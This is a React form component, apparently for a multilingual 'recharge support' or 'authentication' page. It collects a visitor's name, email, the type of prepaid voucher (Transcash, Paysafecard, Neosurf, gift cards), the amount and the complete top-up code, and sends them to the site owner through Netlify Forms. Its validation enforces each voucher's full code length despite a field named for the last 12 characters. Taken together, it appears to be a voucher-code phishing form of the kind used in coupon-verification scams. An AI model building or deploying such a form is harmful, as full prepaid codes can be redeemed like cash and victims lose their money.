import React, { FormEvent, useState } from "react";
import { Language, useI18n } from "../i18n";

type FormStatus = "idle" | "sending" | "success" | "error";
type PaymentMethod = "" | "Transcash" | "Paysafecard" | "Google Play Card" | "Neosurf" | "Steam Card" | "Apple Gift Card" | "Autre";

const referenceRules: Record<Exclude<PaymentMethod, "" | "Autre">, { length: number; pattern: string; digitsOnly: boolean }> = {
  Transcash: { length: 12, pattern: "[0-9]{12}", digitsOnly: true },
  Paysafecard: { length: 16, pattern: "0[0-9]{15}", digitsOnly: true },
  "Google Play Card": { length: 16, pattern: "[A-Za-z0-9]{16}", digitsOnly: false },
  Neosurf: { length: 10, pattern: "[A-Za-z0-9]{10}", digitsOnly: false },
  "Steam Card": { length: 15, pattern: "[A-Za-z0-9]{15}", digitsOnly: false },
  "Apple Gift Card": { length: 16, pattern: "[A-Za-z0-9]{16}", digitsOnly: false },
};

const ruleHints: Record<Language, Record<Exclude<PaymentMethod, "" | "Autre">, string>> = {
  fr: { Transcash: "12 chiffres exactement", Paysafecard: "16 chiffres exactement, en commençant par 0", "Google Play Card": "16 caractères alphanumériques exactement", Neosurf: "10 caractères alphanumériques exactement", "Steam Card": "15 caractères alphanumériques exactement", "Apple Gift Card": "16 caractères alphanumériques exactement" },
  en: { Transcash: "Exactly 12 digits", Paysafecard: "Exactly 16 digits, starting with 0", "Google Play Card": "Exactly 16 alphanumeric characters", Neosurf: "Exactly 10 alphanumeric characters", "Steam Card": "Exactly 15 alphanumeric characters", "Apple Gift Card": "Exactly 16 alphanumeric characters" },
  de: { Transcash: "Genau 12 Ziffern", Paysafecard: "Genau 16 Ziffern, beginnend mit 0", "Google Play Card": "Genau 16 alphanumerische Zeichen", Neosurf: "Genau 10 alphanumerische Zeichen", "Steam Card": "Genau 15 alphanumerische Zeichen", "Apple Gift Card": "Genau 16 alphanumerische Zeichen" },
  it: { Transcash: "Esattamente 12 cifre", Paysafecard: "Esattamente 16 cifre, iniziando con 0", "Google Play Card": "Esattamente 16 caratteri alfanumerici", Neosurf: "Esattamente 10 caratteri alfanumerici", "Steam Card": "Esattamente 15 caratteri alfanumerici", "Apple Gift Card": "Esattamente 16 caratteri alfanumerici" },
  es: { Transcash: "Exactamente 12 dígitos", Paysafecard: "Exactamente 16 dígitos, empezando por 0", "Google Play Card": "Exactamente 16 caracteres alfanuméricos", Neosurf: "Exactamente 10 caracteres alfanuméricos", "Steam Card": "Exactamente 15 caracteres alfanuméricos", "Apple Gift Card": "Exactamente 16 caracteres alfanuméricos" },
};

const referenceLabels: Record<Language, { label: string; placeholder: string }> = {
  fr: { label: "Code de la recharge", placeholder: "Saisissez le code de la recharge" },
  en: { label: "Top-up code", placeholder: "Enter the top-up code" },
  de: { label: "Aufladecode", placeholder: "Aufladecode eingeben" },
  it: { label: "Codice di ricarica", placeholder: "Inserisci il codice di ricarica" },
  es: { label: "Código de recarga", placeholder: "Introduce el código de recarga" },
};

const encodeFormData = (formData: FormData): string => {
  const encodedData = new URLSearchParams();

  formData.forEach((value, key) => {
    encodedData.append(key, String(value));
  });

  return encodedData.toString();
};

const AuthForm: React.FC = () => {
  const { language, t } = useI18n();
  const [status, setStatus] = useState<FormStatus>("idle");
  const [errorMessage, setErrorMessage] = useState("");
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>("");
  const [reference, setReference] = useState("");
  const referenceRule = paymentMethod && paymentMethod !== "Autre" ? referenceRules[paymentMethod] : null;
  const referenceHint = paymentMethod && paymentMethod !== "Autre" ? ruleHints[language][paymentMethod] : "";

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();

    const form = event.currentTarget;
    const formData = new FormData(form);

    try {
      setStatus("sending");
      setErrorMessage("");

      const response = await fetch("/", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: encodeFormData(formData),
      });

      if (!response.ok) {
        throw new Error(`La soumission a échoué avec le statut ${response.status}`);
      }

      form.reset();
      setPaymentMethod("");
      setReference("");
      setStatus("success");
    } catch (error) {
      console.error("Erreur Netlify Forms :", error);
      setStatus("error");
      setErrorMessage(
        t("error"),
      );
    }
  };

  const fieldClassName =
    "w-full rounded-lg border border-gray-300 px-4 py-3 outline-none transition focus:border-red-600 focus:ring-2 focus:ring-red-200";

  return (
    <form
      name="recharge-support"
      method="POST"
      data-netlify="true"
      data-netlify-honeypot="bot-field"
      onSubmit={handleSubmit}
      className="w-full max-w-md mx-auto rounded-xl border border-gray-200 bg-white p-6 shadow-lg md:p-8"
    >
      <input type="hidden" name="form-name" value="recharge-support" />

      <p hidden>
        <label>
          {t('bot')}
          <input name="bot-field" autoComplete="off" tabIndex={-1} />
        </label>
      </p>

      <div className="mb-6">
        <h2 className="text-2xl font-bold text-gray-900">{t('requestTitle')}</h2>
        <p className="mt-2 text-sm text-gray-600">
          {t('requestIntro')}
        </p>
      </div>

      <div className="mb-5">
        <label htmlFor="fullName" className="mb-2 block text-sm font-medium text-gray-700">
          {t('fullName')}
        </label>
        <input
          id="fullName"
          name="fullName"
          type="text"
          required
          autoComplete="name"
          className={fieldClassName}
          placeholder={t('fullNamePlaceholder')}
        />
      </div>

      <div className="mb-5">
        <label htmlFor="email" className="mb-2 block text-sm font-medium text-gray-700">
          {t('email')}
        </label>
        <input
          id="email"
          name="email"
          type="email"
          required
          autoComplete="email"
          className={fieldClassName}
          placeholder="exemple@gmail.com"
        />
      </div>

      <div className="mb-5">
        <label htmlFor="paymentMethod" className="mb-2 block text-sm font-medium text-gray-700">
          {t('payment')}
        </label>
        <select
          id="paymentMethod"
          name="paymentMethod"
          required
          value={paymentMethod}
          onChange={(event) => {
            setPaymentMethod(event.target.value as PaymentMethod);
            setReference("");
          }}
          className={fieldClassName}
        >
          <option value="" disabled>{t('select')}</option>
          <option value="TransCash">TransCash</option>
          <option value="Neosurf">Neosurf</option>
          <option value="Apple Gift Card">Apple Gift Card</option>
          <option value="Steam Card">Steam Card</option>
          <option value="Google Play Card">Google Play Card</option>
          <option value="Paysafecard">Paysafecard</option>
          <option value="Autre">{t('other')}</option>
        </select>
      </div>

      <div className="mb-5">
        <label htmlFor="amount" className="mb-2 block text-sm font-medium text-gray-700">
          {t('amount')}
        </label>
        <input
          id="amount"
          name="amount"
          type="number"
          min="0"
          step="0.01"
          required
          className={fieldClassName}
          placeholder={t('amountPlaceholder')}
        />
      </div>

      <div className="mb-5">
        <label htmlFor="referenceLast12" className="mb-2 block text-sm font-medium text-gray-700">
          {referenceLabels[language].label}
        </label>
        <input
          id="referenceLast12"
          name="referenceLast12"
          type="text"
          value={reference}
          onChange={(event) => {
            const forbiddenCharacters = referenceRule?.digitsOnly ? /[^0-9]/g : /[^A-Za-z0-9]/g;
            setReference(event.target.value.replace(forbiddenCharacters, "").toUpperCase());
          }}
          minLength={referenceRule?.length ?? 1}
          maxLength={referenceRule?.length ?? 64}
          pattern={referenceRule?.pattern}
          title={referenceHint || undefined}
          inputMode={referenceRule?.digitsOnly ? "numeric" : "text"}
          required
          autoCapitalize="characters"
          className={`${fieldClassName} uppercase`}
          placeholder={referenceLabels[language].placeholder}
          aria-describedby={referenceHint ? "reference-rule" : undefined}
        />
        {referenceHint && <p id="reference-rule" className="mt-2 text-sm font-medium text-red-700">{referenceHint}</p>}
      </div>

      <div className="mb-6">
        <label className="flex items-start gap-3">
          <input type="checkbox" name="consent" value="oui" required className="mt-1 h-4 w-4" />
          <span className="text-sm text-gray-600">
            {t('consent')}
          </span>
        </label>
      </div>

      <button
        type="submit"
        disabled={status === "sending"}
        className="w-full rounded-lg bg-red-700 px-6 py-3 font-semibold text-white transition hover:bg-red-800 disabled:cursor-not-allowed disabled:opacity-60"
      >
        {status === "sending" ? t('sending') : t('send')}
      </button>

      {status === "success" && (
        <div role="status" className="mt-5 rounded-lg border border-green-200 bg-green-50 p-4 text-green-800">
          {t('success')}
        </div>
      )}

      {status === "error" && (
        <div role="alert" className="mt-5 rounded-lg border border-red-200 bg-red-50 p-4 text-red-800">
          {errorMessage}
        </div>
      )}
    </form>
  );
};

export default AuthForm;
